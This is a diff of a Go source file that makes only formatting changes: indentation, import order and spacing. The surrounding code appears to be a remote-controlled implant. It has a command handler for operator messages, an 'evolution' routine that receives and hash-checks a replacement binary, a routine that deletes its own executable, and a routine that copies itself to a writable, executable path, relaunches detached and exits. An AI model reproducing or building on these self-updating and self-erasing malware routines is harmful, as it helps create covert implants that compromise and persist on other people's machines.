@@ -4,19 +4,19 @@ package base
 
 import (
 	"net"
-//	"io"
+	//	"io"
 	"os"
 	"os/exec"
 	"syscall"
-//	"sync"
-//	"time"
-//	"runtime"
+	//	"sync"
+	//	"time"
+	//	"runtime"
 	"bytes"
 	"io/ioutil"
 
-	kit "local/toolkit"
-	"lib/smux"
 	"lib/godaemon"
+	"lib/smux"
+	kit "local/toolkit"
 )
 
 func init() {
@@ -40,7 +40,7 @@ var extraInit = func(c *Client) {
 	}
 }
 
-var ccX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
+var ccX = func(op string, p1 net.Conn, c *Client, mux *smux.Session) {
 	switch op {
 	case B_reconn:
 		mux.Close()
@@ -57,20 +57,20 @@ var ccX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
 	case B_evolution:
 		fhb, err := kit.ReadVTagByte(p1)
 		if err != nil {
-//fmt.Println("[evolution][err]fhb", err)
+			//fmt.Println("[evolution][err]fhb", err)
 			break
 		}
 
 		fb, err := kit.ReadVTagByte(p1)
 		if err != nil {
-//fmt.Println("[evolution][err]fb", err)
+			//fmt.Println("[evolution][err]fb", err)
 			break
 		}
 
 		checkb := kit.HashBytes256(fb)
-//fmt.Println("[evolution]", len(fb), kit.Hex(checkb), kit.Hex(fhb))
+		//fmt.Println("[evolution]", len(fb), kit.Hex(checkb), kit.Hex(fhb))
 		if !bytes.Equal(checkb, fhb) {
-//fmt.Println("[evolution][err]!bytes.Equal", kit.Hex(checkb), kit.Hex(fhb))
+			//fmt.Println("[evolution][err]!bytes.Equal", kit.Hex(checkb), kit.Hex(fhb))
 			break
 		}
 
@@ -87,7 +87,7 @@ var ccX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
 	}
 }
 
-var cleanSelf = func () {
+var cleanSelf = func() {
 	name, err := kit.GetSelf()
 	if err != nil {
 		return
@@ -95,10 +95,10 @@ var cleanSelf = func () {
 	os.Remove(name)
 }
 
-var loadSelf = func (c *Client) {
+var loadSelf = func(c *Client) {
 	fd, err := os.OpenFile("/proc/self/exe", os.O_RDONLY, 0400)
 	if err != nil {
-//fmt.Println("[err]os.OpenFile", err)
+		//fmt.Println("[err]os.OpenFile", err)
 		return
 	}
 	defer fd.Close()
@@ -115,10 +115,10 @@ var loadSelf = func (c *Client) {
 	c.binMx.Unlock()
 }
 
-var dumpSelf = func (c *Client) {
+var dumpSelf = func(c *Client) {
 	ofd, ofp, err := kit.TryWX()
 	if err != nil {
-//fmt.Println("[err]TryWX()", err)
+		//fmt.Println("[err]TryWX()", err)
 		return
 	}
 
@@ -135,13 +135,13 @@ var dumpSelf = func (c *Client) {
 	pl := exec.Command(ofp, os.Args[1:]...)
 	pl.SysProcAttr = &syscall.SysProcAttr{
 		Setpgid: true,
-//		Noctty: true,
+		//		Noctty: true,
 	}
 	err = pl.Start()
 
 	// TODO: fallback
 	if err != nil {
-//fmt.Println("[err]pl.Start()", err)
+		//fmt.Println("[err]pl.Start()", err)
 		c.selfbyte = c.selfbyte1
 		c.selfhex = c.selfhex1
 		c.selfbyte1 = nil
@@ -151,4 +151,3 @@ var dumpSelf = func (c *Client) {
 	pl.Process.Release()
 	os.Exit(0)
 }
-
